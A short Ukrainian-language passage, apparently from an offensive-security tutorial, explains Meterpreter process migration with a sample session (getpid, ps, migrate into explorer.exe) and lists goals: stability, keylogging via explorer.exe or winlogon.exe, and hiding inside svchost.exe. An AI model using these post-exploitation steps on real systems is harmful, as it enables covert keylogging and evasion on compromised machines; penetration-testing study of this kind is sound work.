Міграція процесів

Migrate — переміщення Meterpreter з одного процесу в інший для стабільності, привілеїв або маскування.
meterpreter> getpid Current pid: 4872 (notepad.exe) ← нестабільний, може бути закритий meterpreter> ps PID Name User 552 csrss.exe NT AUTHORITY\SYSTEM 2816 explorer.exe CORP\jsmith ← стабільний, для keylog 3120 svchost.exe NT AUTHORITY\SYSTEM ← для getsystem meterpreter> migrate 2816 [*] Migrating from 4872 to 2816... [*] Migration completed successfully.

Стабільність

explorer.exe — не закривається до кінця сесії

Кейлоггінг

explorer.exe або winlogon.exe для перехоплення вводу

Маскування

svchost.exe — виглядає як легітимний системний процес
